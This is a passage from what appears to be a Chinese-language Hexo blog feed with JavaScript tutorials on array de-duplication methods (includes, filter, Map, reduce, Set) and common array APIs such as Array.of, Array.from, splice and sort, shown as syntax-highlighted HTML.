arrry.push(arr[i])            obj[arr[i]] = <span class="hljs-number">1</span>        &#125; <span class="hljs-keyword">else</span> &#123;            obj[arr[i]]++        &#125;    &#125;    <span class="hljs-keyword">return</span> arrry;&#125;    var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];        console.log(<span class="hljs-keyword">unique</span>(arr))//[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;]    //两个<span class="hljs-keyword">true</span>直接去掉了，<span class="hljs-keyword">NaN</span>和&#123;&#125;去重</code></pre></div><h2 id="六、利用includes"><a href="#六、利用includes" class="headerlink" title="六、利用includes"></a>六、利用includes</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">Array</span>.isArray(arr)) &#123;        console.log(<span class="hljs-string">&#x27;type error!&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    var <span class="hljs-keyword">array</span> =[];    <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;            <span class="hljs-keyword">if</span>( !<span class="hljs-keyword">array</span>.includes( arr[i]) ) &#123;//includes 检测数组是否有某个值                    <span class="hljs-keyword">array</span>.push(arr[i]);              &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>&#125;var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];    console.log(<span class="hljs-keyword">unique</span>(arr))    //[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;, &#123;…&#125;]     //&#123;&#125;没有去重</code></pre></div><h2 id="七、利用hasOwnProperty"><a href="#七、利用hasOwnProperty" class="headerlink" title="七、利用hasOwnProperty"></a>七、利用hasOwnProperty</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;    var obj = &#123;&#125;;    <span class="hljs-keyword">return</span> arr.<span class="hljs-keyword">filter</span>(<span class="hljs-keyword">function</span>(item, <span class="hljs-keyword">index</span>, arr)&#123;        <span class="hljs-keyword">return</span> obj.hasOwnProperty(typeof item + item) ? <span class="hljs-keyword">false</span> : (obj[typeof item + item] = <span class="hljs-keyword">true</span>)    &#125;)&#125;    var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];        console.log(<span class="hljs-keyword">unique</span>(arr))//[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;]   //所有的都去重了</code></pre></div><p>利用hasOwnProperty 判断是否存在对象属性</p><h2 id="八、利用filter"><a href="#八、利用filter" class="headerlink" title="八、利用filter"></a>八、利用filter</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;  <span class="hljs-keyword">return</span> arr.<span class="hljs-keyword">filter</span>(<span class="hljs-keyword">function</span>(item, <span class="hljs-keyword">index</span>, arr) &#123;    //当前元素，在原始数组中的第一个索引==当前索引值，否则返回当前元素    <span class="hljs-keyword">return</span> arr.indexOf(item, <span class="hljs-number">0</span>) === <span class="hljs-keyword">index</span>;  &#125;);&#125;    var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];        console.log(<span class="hljs-keyword">unique</span>(arr))//[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;, &#123;…&#125;]</code></pre></div><h2 id="九、利用递归去重"><a href="#九、利用递归去重" class="headerlink" title="九、利用递归去重"></a>九、利用递归去重</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;        var <span class="hljs-keyword">array</span>= arr;        var len = <span class="hljs-keyword">array</span>.length;    <span class="hljs-keyword">array</span>.sort(<span class="hljs-keyword">function</span>(a,b)&#123;   //排序后更加方便去重        <span class="hljs-keyword">return</span> a - b;    &#125;)    <span class="hljs-keyword">function</span> <span class="hljs-keyword">loop</span>(<span class="hljs-keyword">index</span>)&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">index</span> &gt;= <span class="hljs-number">1</span>)&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">array</span>[<span class="hljs-keyword">index</span>] === <span class="hljs-keyword">array</span>[<span class="hljs-keyword">index</span><span class="hljs-number">-1</span>])&#123;                <span class="hljs-keyword">array</span>.splice(<span class="hljs-keyword">index</span>,<span class="hljs-number">1</span>);            &#125;            <span class="hljs-keyword">loop</span>(<span class="hljs-keyword">index</span> - <span class="hljs-number">1</span>);    //递归<span class="hljs-keyword">loop</span>，然后数组去重        &#125;    &#125;    <span class="hljs-keyword">loop</span>(len<span class="hljs-number">-1</span>);    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>;&#125; var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];console.log(<span class="hljs-keyword">unique</span>(arr))//[<span class="hljs-number">1</span>, &quot;a&quot;, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, <span class="hljs-number">1</span>, &#123;…&#125;, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;, undefined]</code></pre></div><h2 id="十、利用Map数据结构去重"><a href="#十、利用Map数据结构去重" class="headerlink" title="十、利用Map数据结构去重"></a>十、利用Map数据结构去重</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> arrayNonRepeatfy(arr) &#123;  let map = <span class="hljs-built_in">new</span> Map();  let <span class="hljs-keyword">array</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">Array</span>();  // 数组用于返回结果  <span class="hljs-keyword">for</span> (let i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;    <span class="hljs-keyword">if</span>(map .has(arr[i])) &#123;  // 如果有该key值      map .<span class="hljs-keyword">set</span>(arr[i], <span class="hljs-keyword">true</span>);     &#125; <span class="hljs-keyword">else</span> &#123;       map .<span class="hljs-keyword">set</span>(arr[i], <span class="hljs-keyword">false</span>);   // 如果没有该key值      <span class="hljs-keyword">array</span> .push(arr[i]);    &#125;  &#125;   <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span> ;&#125; var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];    console.log(<span class="hljs-keyword">unique</span>(arr))//[<span class="hljs-number">1</span>, &quot;a&quot;, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, <span class="hljs-number">1</span>, &#123;…&#125;, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;, undefined]</code></pre></div><p>创建一个空Map数据结构，遍历需要去重的数组，把数组的每一个元素作为key存到Map中。由于Map中不会出现相同的key值，所以最终得到的就是去重后的结果。</p><h2 id="十一、利用reduce-includes"><a href="#十一、利用reduce-includes" class="headerlink" title="十一、利用reduce+includes"></a>十一、利用reduce+includes</h2><div class="hljs code-wrapper"><pre><code class="hljs coffeescript">function unique(arr)&#123;    <span class="hljs-keyword">return</span> arr.reduce(<span class="hljs-function"><span class="hljs-params">(prev,cur)</span> =&gt;</span> prev.includes(cur) ? prev : [...prev,cur],[]);&#125;var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>, <span class="hljs-literal">undefined</span>,<span class="hljs-literal">undefined</span>, <span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>, <span class="hljs-literal">NaN</span>, <span class="hljs-literal">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];<span class="hljs-built_in">console</span>.log(unique(arr));<span class="hljs-regexp">//</span> [<span class="hljs-number">1</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">15</span>, <span class="hljs-literal">false</span>, <span class="hljs-literal">undefined</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">NaN</span>, <span class="hljs-string">&quot;NaN&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;a&quot;</span>, &#123;…&#125;, &#123;…&#125;]</code></pre></div><h2 id="十二、-…new-Set-arr"><a href="#十二、-…new-Set-arr" class="headerlink" title="十二、[…new Set(arr)]"></a>十二、[…new Set(arr)]</h2><div class="hljs code-wrapper"><pre><code class="hljs cos">[.<span class="hljs-built_in">..new</span> <span class="hljs-keyword">Set</span>(arr)] <span class="hljs-comment">//代码就是这么少----（其实，严格来说并不算是一种，相对于第一种方法来说只是简化了代码）</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组常用api🎇</title>
    <link href="/hexo_blog/2021/08/12/%E6%95%B0%E7%BB%84%E5%B8%B8%E7%94%A8api/"/>
    <url>/hexo_blog/2021/08/12/%E6%95%B0%E7%BB%84%E5%B8%B8%E7%94%A8api/</url>
    
    <content type="html"><![CDATA[<h1 id="数组常用api✊"><a href="#数组常用api✊" class="headerlink" title="数组常用api✊"></a>数组常用api✊</h1><h3 id="创建一个数组"><a href="#创建一个数组" class="headerlink" title="创建一个数组:"></a>创建一个数组:</h3><div class="hljs code-wrapper"><pre><code class="hljs awk">    <span class="hljs-regexp">//</span> 字面量方式:    <span class="hljs-regexp">//</span> 这个方法也是我们最常用的，在初始化数组的时候 相当方便    var a = [<span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>];  <span class="hljs-regexp">//</span> [<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>];    <span class="hljs-regexp">//</span> 构造器:    <span class="hljs-regexp">//</span> 实际上 new Array === Array,加不加new 一点影响都没有。    var a = Array(); <span class="hljs-regexp">//</span> []     var a = Array(<span class="hljs-number">3</span>); <span class="hljs-regexp">//</span> [,,]     var a = Array(<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>); <span class="hljs-regexp">//</span> [ <span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span> ]复制代码</code></pre></div><h4 id="ES6-Array-of-返回由所有参数值组成的数组"><a href="#ES6-Array-of-返回由所有参数值组成的数组" class="headerlink" title="ES6 Array.of()  返回由所有参数值组成的数组"></a>ES6 Array.of()  返回由所有参数值组成的数组</h4><p>定义：返回由所有参数值组成的数组，如果没有参数，就返回一个空数组。</p><p>目的：Array.of() 出现的目的是为了解决上述构造器因参数个数不同，导致的行为有差异的问题。</p><div class="hljs code-wrapper"><pre><code class="hljs reasonml">    <span class="hljs-keyword">let</span> a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">of</span>(<span class="hljs-number">3</span>, <span class="hljs-number">11</span>, <span class="hljs-number">8</span>); <span class="hljs-comment">// [3,11,8]</span>    <span class="hljs-keyword">let</span> a = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">of</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// [3]</span>复制代码</code></pre></div><h4 id="ES6-Arrary-from-将两类对象转为真正的数组"><a href="#ES6-Arrary-from-将两类对象转为真正的数组" class="headerlink" title="ES6 Arrary.from() 将两类对象转为真正的数组"></a>ES6 Arrary.from() 将两类对象转为真正的数组</h4><p>定义：用于将两类对象转为真正的数组（不改变原对象，返回新的数组）。</p><p>参数：</p><p>第一个参数(必需):要转化为真正数组的对象。</p><p>第二个参数(可选): 类似数组的map方法，对每个元素进行处理，将处理后的值放入返回的数组。</p><p>第三个参数(可选): 用来绑定this。</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    <span class="hljs-regexp">//</span> <span class="hljs-number">1</span>. 对象拥有length属性    let obj = &#123;<span class="hljs-number">0</span>: <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">2</span>:<span class="hljs-string">&#x27;c&#x27;</span>, length: <span class="hljs-number">3</span>&#125;;    let arr = Array.from(obj); <span class="hljs-regexp">//</span> [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>];    <span class="hljs-regexp">//</span> <span class="hljs-number">2</span>. 部署了 Iterator接口的数据结构 比如:字符串、Set、NodeList对象    let arr = Array.from(<span class="hljs-string">&#x27;hello&#x27;</span>); <span class="hljs-regexp">//</span> [<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>]    let arr = Array.from(new Set([<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>])); <span class="hljs-regexp">//</span> [<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>]复制代码</code></pre></div><hr><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法:"></a>常用方法:</h3><p>数组原型提供了非常多的方法，这里分为三类来讲，一类会改变原数组的值，一类是不会改变原数组，以及数组的遍历方法。</p><h4 id="改变原数组的方法-9个"><a href="#改变原数组的方法-9个" class="headerlink" title="改变原数组的方法(9个):"></a>改变原数组的方法(9个):</h4><div class="hljs code-wrapper"><pre><code class="hljs gradle">    let a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];    ES5:     a.splice()<span class="hljs-regexp">/ a.sort() /</span> a.<span class="hljs-keyword">pop</span>()<span class="hljs-regexp">/ a.shift()/</span>  a.<span class="hljs-keyword">push</span>()<span class="hljs-regexp">/ a.unshift()/</span> a.<span class="hljs-keyword">reverse</span>()    ES6:    a.copyWithin() / a.fill复制代码</code></pre></div><p>对于这些能够改变原数组的方法，要注意避免在循环遍历中改变原数组的选项，比如: 改变数组的长度，导致遍历的长度出现问题。</p><h4 id="splice-添加-删除数组元素"><a href="#splice-添加-删除数组元素" class="headerlink" title="splice() 添加/删除数组元素"></a>splice() 添加/删除数组元素</h4><p>定义： splice() 方法<strong>向/从数组中添加/删除</strong>项目，然后返回被删除的项目</p><p>语法： <code>array.splice(index,howmany,item1,.....,itemX)</code></p><p>参数:</p><ol><li>index：必需。整数，规定添加/删除项目的位置，使用负数可从数组结尾处规定位置。</li><li>howmany：可选。要删除的项目数量。如果设置为 0，则不会删除项目。</li><li>item1, …, itemX： 可选。向数组添加的新项目。</li></ol><p>返回值: 如果有元素被删除,返回包含被删除项目的新数组。</p><p>eg1:删除元素</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.splice(0,</span> <span class="hljs-number">3</span><span class="hljs-string">);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]    <span class="hljs-string">//</span> <span class="hljs-string">从数组下标0开始，删除3个元素</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.splice(-1,</span> <span class="hljs-number">3</span><span class="hljs-string">);</span> <span class="hljs-string">//</span> [<span class="hljs-number">7</span>]    <span class="hljs-string">//</span> <span class="hljs-string">从最后一个元素开始删除3个元素，因为最后一个元素，所以只删除了7</span><span class="hljs-string">复制代码</span></code></pre></div><p>eg2: 删除并添加</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">     <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.splice(0,3,&#x27;添加&#x27;);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-string">&#x27;添加&#x27;</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]    <span class="hljs-string">//</span> <span class="hljs-string">从数组下标0开始，删除3个元素，并添加元素&#x27;添加&#x27;</span>     <span class="hljs-string">let</span> <span class="hljs-string">b</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">b.splice(-2,3,&#x27;添加1&#x27;,&#x27;添加2&#x27;);</span> <span class="hljs-string">//</span> [<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]    <span class="hljs-string">console.log(b);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;添加1&#x27;</span>,<span class="hljs-string">&#x27;添加2&#x27;</span>]    <span class="hljs-string">//</span> <span class="hljs-string">从数组最后第二个元素开始，删除3个元素，并添加两个元素&#x27;添加1&#x27;、&#x27;添加2&#x27;</span><span class="hljs-string">复制代码</span></code></pre></div><p>eg3: 不删除只添加:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml">    <span class="hljs-string">let</span> <span class="hljs-string">a</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">a.splice(0,0,&#x27;添加1&#x27;,&#x27;添加2&#x27;);</span> <span class="hljs-string">//</span> [] <span class="hljs-string">没有删除元素，返回空数组</span>    <span class="hljs-string">console.log(a);</span> <span class="hljs-string">//</span> [<span class="hljs-string">&#x27;添加1&#x27;</span>,<span class="hljs-string">&#x27;添加2&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]    <span class="hljs-string">let</span> <span class="hljs-string">b</span> <span class="hljs-string">=</span> [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<span class="hljs-string">;</span>    <span class="hljs-string">let</span> <span class="hljs-string">item</span> <span class="hljs-string">=</span> <span class="hljs-string">b.splice(-1,0,&#x27;添加1&#x27;,&#x27;添加2&#x27;);</span> <span class="hljs-string">//</span> [] <span class="hljs-string">没有删除元素，返回空数组</span>    <span class="hljs-string">console.log(b);</span> <span class="hljs-string">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;添加1&#x27;</span>,<span class="hljs-string">&#x27;添加2&#x27;</span>,<span class="hljs-number">7</span>] <span class="hljs-string">在最后一个元素的前面添加两个元素</span><span class="hljs-string">复制代码</span></code></pre></div><p>从上述三个栗子可以得出:</p><ol><li>数组如果元素不够，会删除到最后一个元素为止</li><li>操作的元素，包括开始的那个元素</li><li>可以添加很多个元素</li><li>添加是在开始的元素前面添加的</li></ol><h4 id="sort-数组排序"><a href="#sort-数组排序" class="headerlink" title="sort() 数组排序"></a>sort() 数组排序</h4><p>定义: sort()方法对数组元素进行排序，并返回这个数组。</p><p>参数可选: 规定排序顺序的比较函数。</p><p>默认情况下sort()方法没有传比较函数的话，默认按字母升序，如果不是元素不是字符串的话，会调用<code>toString()</code>方法将元素转化为字符串的Unicode(万国码)位点，然后再比较字符。</p><div class="hljs code-wrapper"><pre><code class="hljs awk">    <span class="hljs-regexp">//</span> 字符串排列 看起来很正常    var a = [<span class="hljs-string">&quot;Banana&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>, <span class="hljs-string">&quot;Apple&quot;</span>, <span class="hljs-string">&quot;Mango&quot;</span>];    a.sort(); <span class="hljs-regexp">//</span> [<span class="hljs-string">&quot;Apple&quot;</span>,<span class="hljs-string">&quot;Banana&quot;</span>,<span class="hljs-string">&quot;Mango&quot;</span>,<span class="hljs-string">&quot;Orange&quot;</span>]    <span class="hljs-regexp">//</span> 数字排序的时候 因为转换成Unicode字符串之后，有些数字会比较大会排在后面 这显然不是我们想要的    vara = [<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">20</span>,<span class="hljs-number">25</span>,<span class="hljs-number">8</span>];    console.log(a.sort()) <span class="hljs-regexp">//</span> [<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">20</span>,<span class="hljs-number">25</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>];复制代码</code></pre></div><p><strong>比较函数的两个参数：</strong></p><p>sort的比较函数有两个默认参数，要在函数中接收这两个参数，这两个参数是数组中两个要比较的元素，通常我们用 a 和 b 接收两个将要比较的元素：</p><ul><li>若比较函数返回值&lt;0，那么a将排到b的前面;</li><li>若比较函数返回值=0，那么a 和 b 相对位置不变；</li><li>若比较函数返回值&gt;0，那么b 排在a 将的前面；</li></ul><p>对于sort()方法更深层级的内部实现以及处理机制可以看一下这篇文章<a href="https://juejin.cn/post/6844903507439419399">深入了解javascript的sort方法</a></p><p><strong>sort排序常见用法</strong>：</p><ol><li><p>数组元素为数字的升序、降序:</p><div class="hljs code-wrapper"><pre><code class="hljs yaml"> <span class="hljs-string">var</span> <span class="hljs-string">array</span> <span class="hljs-string">=</span>  [<span class="hljs-number">10</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>,<span class="hljs-number">20</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>,<span class="hljs-number">8</span>]<span class="hljs-string">;</span> <span class="hljs-string">//</span> <span class="hljs-string">升序</span> <span class="hljs-string">a-b</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">0</span>   <span class="hljs-string">a将排到b的前面，按照a的大小来排序的</span>  <span class="hljs-string">//</span> <span class="hljs-string">比如被减数a是10，减数是20</span>  <span class="hljs-number">10</span><span class="hljs-number">-20</span> <span class="hljs-string">&lt;</span> <span class="hljs-number">0</span>   <span class="hljs-string">被减数a(10)在减数b(20)前面</span>    <span class="hljs-string">array.sort(function(a,b)&#123;</span>   <span class="hljs-string">return</span> <span class="hljs-string">a-b;</span> <span class="hljs-string">&#125;);</span> <span class="hljs-string">console.log(array);</span> <span 